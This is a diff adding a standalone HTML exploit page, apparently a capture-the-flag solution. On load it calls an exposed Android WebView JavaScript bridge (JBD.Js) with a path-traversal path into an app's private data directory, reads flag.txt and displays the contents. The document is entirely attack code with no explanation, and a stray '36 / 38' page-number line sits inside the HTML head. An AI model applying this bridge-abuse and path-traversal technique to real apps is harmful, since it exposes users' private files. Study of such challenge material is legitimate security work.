@@ -1,0 +1,25 @@
+ <!DOCTYPE html>
+ <html>
+ 36 / 38
+<head>
+ <meta charset="utf-8">
+ <title>Exploit</title>
+ <script>
+ window.onload = function () {
+ const path = 
+"/data/data/com.swdd.eddddge/../com.swdd.eddddge/files/flag.txt";
+ const resultElement = document.getElementById('result');
+ try {
+ const content = JBD.Js(path);
+ resultElement.innerHTML = "FLAG: " + content;
+ } catch (e) {
+ resultElement.innerHTML = "Exploit failed: " + e;
+ }
+ };
+ </script>
+ </head>
+ <body>
+ <h1>Exploit Running...</h1>
+ <div id="result"></div>
+ </body>
+ </html>
